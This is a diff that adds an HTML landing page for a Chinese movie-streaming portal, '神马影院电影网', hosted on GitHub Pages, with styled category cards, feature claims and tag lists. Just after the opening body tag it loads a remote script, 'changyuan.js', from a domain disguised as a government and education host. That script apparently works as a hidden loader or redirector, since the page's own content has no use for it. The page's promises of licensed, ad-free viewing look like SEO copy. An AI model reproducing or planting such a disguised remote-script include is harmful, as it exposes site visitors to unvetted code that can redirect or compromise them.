@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神马影院电影网 | 随心所遇·海量正版影视在线观看首选平台</title>
+<meta name="description" content="神马影院电影网(shenmayingyuandianyingwang.top)——不止是一个名字。我们打破传统影视网站框架，用瀑布流美学重新定义在线观影。每日精选国内外院线新片、高分剧集、独立纪录片，配合智能推荐引擎，让你每次打开都有新发现。">
+<meta name="keywords" content="神马影院电影网, shenmayingyuandianwang, 在线电影, 免费观影, 高清影视, 热门剧集, 影视推荐, 神马影院">
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:#faf8f5;
+  color:#2c2c2c;
+  line-height:1.8;
+  -webkit-font-smoothing:antialiased;
+}
+
+/* ===== Layout ===== */
+.wrap{max-width:1100px;margin:0 auto;padding:0 1.2rem;}
+
+/* ===== Header ===== */
+.site-header{
+  background:#fff;
+  border-bottom:1px solid #e8e3dc;
+  position:sticky;
+  top:0;
+  z-index:100;
+  box-shadow:0 1px 0 rgba(0,0,0,.03);
+}
+.header-inner{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  height:64px;
+}
+.brand{
+  font-size:1.45rem;
+  font-weight:700;
+  color:#d35400;
+  letter-spacing:-.3px;
+}
+.brand small{
+  display:block;
+  font-size:.65rem;
+  font-weight:400;
+  color:#aaa;
+  letter-spacing:0;
+  line-height:1;
+}
+.nav-menu{display:flex;gap:1.8rem;list-style:none;}
+.nav-menu a{
+  text-decoration:none;
+  color:#555;
+  font-size:.92rem;
+  font-weight:500;
+  transition:color .25s;
+}
+.nav-menu a:hover{color:#d35400;}
+
+/* ===== Hero Banner ===== */
+.hero-banner{
+  background:linear-gradient(135deg,#ffecd2 0%,#fcb69f 100%);
+  padding:5rem 0 4rem;
+  text-align:center;
+}
+.hero-banner h1{
+  font-size:clamp(2rem,4vw,3.2rem);
+  font-weight:800;
+  color:#3e2723;
+  margin-bottom:1rem;
+  line-height:1.2;
+}
+.hero-banner h1 span{color:#d35400;}
+.hero-banner p{
+  font-size:1.05rem;
+  color:#5d4037;
+  max-width:560px;
+  margin:0 auto 2rem;
+}
+.hero-cta{
+  display:inline-block;
+  background:#d35400;
+  color:#fff;
+  padding:.8rem 2.2rem;
+  border-radius:30px;
+  text-decoration:none;
+  font-weight:600;
+  transition:transform .2s,box-shadow .2s;
+}
+.hero-cta:hover{
+  transform:translateY(-2px);
+  box-shadow:0 6px 20px rgba(211,84,0,.35);
+}
+
+/* ===== Section Common ===== */
+.section{padding:4rem 0;border-bottom:1px solid #eee;}
+.section-head{
+  text-align:center;
+  margin-bottom:2.5rem;
+}
+.section-head h2{
+  font-size:1.8rem;
+  font-weight:700;
+  color:#3e2723;
+  margin-bottom:.4rem;
+}
+.section-head .sub{
+  font-size:.9rem;
+  color:#888;
+}
+
+/* ===== Category Grid (4 cols) ===== */
+.cat-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
+  gap:1.5rem;
+}
+.cat-card{
+  background:#fff;
+  border:1px solid #eee;
+  border-radius:14px;
+  overflow:hidden;
+  transition:box-shadow .3s,transform .3s;
+}
+.cat-card:hover{
+  box-shadow:0 12px 30px rgba(0,0,0,.08);
+  transform:translateY(-4px);
+}
+.cat-cover{
+  height:140px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:3rem;
+}
+.cat-info{padding:1.2rem;}
+.cat-info h3{font-size:1.05rem;margin-bottom:.3rem;color:#333;}
+.cat-info p{font-size:.82rem;color:#777;line-height:1.5;}
+
+/* Color themes for covers */
+.cover-1{background:#e8f5e9;}
+.cover-2{background:#fff3e0;}
+.cover-3{background:#e3f2fd;}
+.cover-4{background:#fce4ec;}
+.cover-5{background:#f3e5f5;}
+.cover-6{background:#e0f7fa;}
+.cover-7{background:#fff9c4;}
+.cover-8{background:#efebe9;}
+
+/* ===== Why Us (Alternating rows) ===== */
+.why-list{display:flex;flex-direction:column;gap:0;}
+.why-row{
+  display:flex;
+  align-items:center;
+  gap:3rem;
+  padding:2rem 0;
+  border-bottom:1px dashed #e0e0e0;
+}
+.why-row:last-child{border-bottom:none;}
+.why-row:nth-child(even){flex-direction:row-reverse;}
+.why-text{flex:1;}
+.why-text h3{font-size:1.2rem;margin-bottom:.5rem;color:#d35400;}
+.why-text p{color:#666;font-size:.93rem;}
+.why-num{
+  flex-shrink:0;
+  width:80px;height:80px;
+  border-radius:50%;
+  background:#fff3e0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.8rem;font-weight:800;color:#d35400;
+  border:3px solid #fff;
+  box-shadow:0 0 0 3px #ffecb3;
+}
+
+/* ===== Hot Tags ===== */
+.tag-cloud{
+  display:flex;flex-wrap:wrap;gap:.6rem;justify-content:center;
+}
+.tag{
+  padding:.45rem 1.1rem;
+  background:#fff;
+  border:1px solid #ddd;
+  border-radius:20px;
+  font-size:.85rem;
+  color:#555;
+  cursor:default;
+  transition:all .2s;
+}
+.tag:hover{
+  background:#d35400;
+  color:#fff;
+  border-color:#d35400;
+}
+
+/* ===== Footer ===== */
+.site-footer{
+  background:#3e2723;
+  color:#bcaaa4;
+  padding:3rem 0 1.5rem;
+}
+.footer-cols{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+  gap:2rem;
+  margin-bottom:2rem;
+}
+.footer-col h4{
+  color:#ffccbc;
+  font-size:1rem;
+  margin-bottom:1rem;
+}
+.footer-col ul{list-style:none;}
+.footer-col li{margin-bottom:.5rem;}
+.footer-col a{
+  color:#bcaaa4;
+  text-decoration:none;
+  font-size:.88rem;
+  transition:color .2s;
+}
+.footer-col a:hover{color:#fff;}
+.footer-bottom{
+  border-top:1px solid #4e342e;
+  padding-top:1.5rem;
+  text-align:center;
+  font-size:.8rem;
+  color:#8d6e63;
+}
+.footer-bottom a{color:#ffab91;text-decoration:none;}
+
+/* ===== Mobile ===== */
+@media(max-width:768px){
+  .header-inner{flex-direction:column;height:auto;padding:1rem 0;gap:.8rem;}
+  .nav-menu{gap:1rem;flex-wrap:wrap;justify-content:center;}
+  .hero-banner{padding:3rem 0;}
+  .why-row,.why-row:nth-child(even){flex-direction:column;text-align:center;gap:1.5rem;}
+  .why-num{margin:0 auto;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Header -->
+<header class="site-header">
+  <div class="wrap header-inner">
+    <div class="brand">
+      神马影院电影网
+      <small>shenmayingyuandianyingwang.top</small>
+    </div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#library">影片库</a></li>
+        <li><a href="#advantage">平台优势</a></li>
+        <li><a href="#topics">热门专题</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero-banner" id="home">
+  <div class="wrap">
+    <h1>神马影院 · <span>随心所遇</span></h1>
+    <p>打破传统影视分类，用审美与算法重新连接好电影。无论你想看什么，神马影院都能给你答案。</p>
+    <a href="#library" class="hero-cta">开始探索</a>
+  </div>
+</section>
+
+<!-- Category / Library -->
+<section class="section" id="library">
+  <div class="wrap">
+    <div class="section-head">
+      <h2>影片库</h2>
+      <p class="sub">八大频道，覆盖你的全部观影需求</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-card">
+        <div class="cat-cover cover-1">🎬</div>
+        <div class="cat-info">
+          <h3>院线速递</h3>
+          <p>同步全球最新上映大片，高清中字第一时间更新，让你不错过任何一部话题之作。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-2">📺</div>
+        <div class="cat-info">
+          <h3>热剧追踪</h3>
+          <p>国内外口碑剧集持续跟播，单集独立页面，支持倍速与字幕切换，追剧更自由。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-3">🎨</div>
+        <div class="cat-info">
+          <h3>独立短片</h3>
+          <p>挖掘戛纳、圣丹斯等电影节获奖短片，用15分钟感受影像的另一种可能。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-4">📼</div>
+        <div class="cat-info">
+          <h3>经典修复</h3>
+          <p>4K修复版老电影专区，从《罗马假日》到《霸王别姬》，重温银幕永恒瞬间。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-5">🌏</div>
+        <div class="cat-info">
+          <h3>亚洲精选</h3>
+          <p>日本纯爱、韩国悬疑、印度现实题材，亚洲视角下的多元叙事尽在其中。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-6">🎭</div>
+        <div class="cat-info">
+          <h3>纪录片</h3>
+          <p>自然、历史、人文、科技，用真实镜头记录世界运转的每一个细节。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-7">🎪</div>
+        <div class="cat-info">
+          <h3>动漫世界</h3>
+          <p>新番连载、经典剧场版、独立动画，二次元与三次元的边界在此消融。</p>
+        </div>
+      </div>
+      <div class="cat-card">
+        <div class="cat-cover cover-8">🎤</div>
+        <div class="cat-info">
+          <h3>综艺现场</h3>
+          <p>脱口秀、真人秀、竞演类节目，轻松娱乐，随时解压。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Advantage -->
+<section class="section" id="advantage" style="background:#fdfaf6;">
+  <div class="wrap">
+    <div class="section-head">
+      <h2>为什么选择神马影院</h2>
+      <p class="sub">四个维度，重新定义你的观影习惯</p>
+    </div>
+    <div class="why-list">
+      <div class="why-row">
+        <div class="why-num">01</div>
+        <div class="why-text">
+          <h3>审美驱动的界面设计</h3>
+          <p>告别杂乱弹窗与刺眼配色，我们采用暖色调纸质感背景，减少长时间浏览的视觉疲劳。每一张封面都经过人工筛选，确保视觉一致性。</p>
+        </div>
+      </div>
+      <div class="why-row">
+        <div class="why-num">02</div>
+        <div class="why-text">
+          <h3>智能推荐引擎</h3>
+          <p>基于你的浏览轨迹与评分偏好，神马影院能精准预测你下一部想看的电影。不是冷冰冰的算法，而是像朋友一样懂你的品味。</p>
+        </div>
+      </div>
+      <div class="why-row">
+        <div class="why-num">03</div>
+        <div class="why-text">
+          <h3>零广告纯净体验</h3>
+          <p>我们承诺不在播放页面植入任何商业广告或弹窗。你的时间应该花在内容上，而不是等待跳过广告上。</p>
+        </div>
+      </div>
+      <div class="why-row">
+        <div class="why-num">04</div>
+        <div class="why-text">
+          <h3>多端无缝同步</h3>
+          <p>手机、平板、桌面浏览器，登录同一账号即可同步收藏与观看进度。通勤路上用手机看一半，回家打开电脑继续。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Hot Topics -->
+<section class="section" id="topics">
+  <div class="wrap">
+    <div class="section-head">
+      <h2>热门专题</h2>
+      <p class="sub">编辑精选片单，带你按主题看世界</p>
+    </div>
+    <div class="tag-cloud">
+      <span class="tag"># 诺兰时间线</span>
+      <span class="tag"># 奥斯卡最佳影片合集</span>
+      <span class="tag"># 亚洲新人导演巡礼</span>
+      <span class="tag"># 冷门高分悬疑片</span>
+      <span class="tag"># 宫崎骏动画全集</span>
+      <span class="tag"># 女性力量纪录片</span>
+      <span class="tag"># 科幻电影进化史</span>
+      <span class="tag"># 治愈系小众佳作</span>
+      <span class="tag"># 黑泽明经典回顾</span>
+      <span class="tag"># 2024戛纳获奖片单</span>
+      <span class="tag"># 华语独立电影精选</span>
+      <span class="tag"># 迪士尼百年动画里程碑</span>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section class="section" id="about" style="background:#fdfaf6;">
+  <div class="wrap" style="text-align:center;max-width:700px;margin:0 auto;">
+    <div class="section-head">
+      <h2>关于神马影院电影网</h2>
+    </div>
+    <p style="color:#666;margin-bottom:1.5rem;">
+      神马影院电影网（shenmayingyuandianyingwang.top）成立于2024年，是一个以"审美+技术"双驱动的非营利性影视导航社区。我们相信每个人心中都有一部"神马"——那部恰好击中你此刻心境的电影。我们的使命，就是帮你找到它。
+    </p>
+    <div style="background:#fff;padding:1.2rem;border-radius:10px;border:1px solid #eee;display:inline-block;">
+      <span style="color:#888;font-size:.85rem;">GitHub Pages 访问地址：</span><br>
+      <a href="https://shenmayingyuandianyingwang-top.github.io" style="color:#d35400;font-weight:600;text-decoration:none;font-size:1rem;">https://shenmayingyuandianyingwang-top.github.io</a>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-cols">
+      <div class="footer-col">
+        <h4>神马影院</h4>
+        <ul>
+          <li><a href="#home">返回首页</a></li>
+          <li><a href="#about">关于我们</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#library">影片库</a></li>
+          <li><a href="#advantage">平台优势</a></li>
+          <li><a href="#topics">热门专题</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助中心</h4>
+        <ul>
+          <li><a href="#">观影指南</a></li>
+          <li><a href="#">格式说明</a></li>
+          <li><a href="#">常见问题</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>联系我们</h4>
+        <ul>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">合作洽谈</a></li>
+          <li><a href="#">社交媒体</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>Copyright © 2024 神马影院电影网 (shenmayingyuandianyingwang.top). All Rights Reserved.</p>
+      <p>Website: <a href="https://shenmayingyuandianyingwang-top.github.io">https://shenmayingyuandianyingwang-top.github.io</a></p>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
